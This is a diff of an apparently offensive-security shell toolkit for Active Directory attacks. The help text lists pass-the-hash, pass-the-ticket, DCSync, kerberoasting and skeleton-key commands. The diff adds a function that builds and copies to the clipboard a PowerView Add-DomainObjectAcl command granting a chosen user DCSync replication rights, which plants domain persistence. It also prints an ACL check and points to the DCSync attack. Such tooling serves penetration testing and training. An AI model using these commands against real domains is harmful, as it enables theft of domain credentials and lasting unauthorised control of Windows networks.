@@ -30,7 +30,6 @@ nb-ad-pwsh-opth                execute over-pass-the-hash with Rubeus.exe
 nb-ad-pwsh-pth                 execute pass-the-hash with Invoke-Mimi.ps1
 nb-ad-pwsh-ptt                 execute pass-the-ticket with Rubeus
 nb-ad-pwsh-dcsync              execute DCSync attack with SafetyKatz for krbtgt user
-nb-ad-pwsh-kerberoasting       kerberoasting
 nb-ad-pwsh-kerberoasting-set-spn   targeted kerberoasting with set SPN
 nb-ad-pwsh-unconstrained       unconstrained delegation
 nb-ad-pwsh-constrained-user    constrained delegation for user
@@ -53,8 +52,8 @@ nb-ad-pwsh-persist-skeleton    create a skeleton key (not opsec safe nor recomme
 Misc
 ----
 nb-ad-cmd-winrs                connect via winrs to a target host
-nb-ad-pwsh-ping                sweep a network subnet with ping requests on windows powershell
 nb-ad-cmd-ping                 sweep a network subnet with ping requests on windows
+nb-ad-pwsh-ping                sweep a network subnet with ping requests on windows powershell
 
 DOC
 }
@@ -143,6 +142,32 @@ nb-ad-pwsh-persist-silver() {
     echo
     __info "Try accessing the service using winrs"
     __ok "nb-ad-cmd-winrs"
+}
+
+nb-ad-pwsh-persist-dcsync() {
+    __check-project
+    __warn "Load PowerView in a process with DA privileges:"
+    __ok ". .\\PowerView.ps1"
+    echo
+    __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
+    local dn && __askvar dn DN
+    __ask "Enter user whom you want to add the DCSync rights"
+    nb-vars-set-user
+    __ask "Enter the current domain name"
+    nb-vars-set-domain
+
+    __COMMAND="Add-DomainObjectAcl -TargetIdentity '$dn' -PrincipalIdentity ${__USER} -Rights DCSync -PrincipalDomain ${__DOMAIN} -TargetDomain ${__DOMAIN} -Verbose"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+    echo
+    __info "You can check if the user has now applied rights using command:"
+    __ok "Get-DomainObjectAcl -SearchBase\"$dn\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match "${__USER}"}"
+    echo
+    __info "You can now run DCSync attack with that user:"
+    __ok "nb-ad-pwsh-dcsync"
 }
 
 nb-ad-pwsh-persist-golden() {
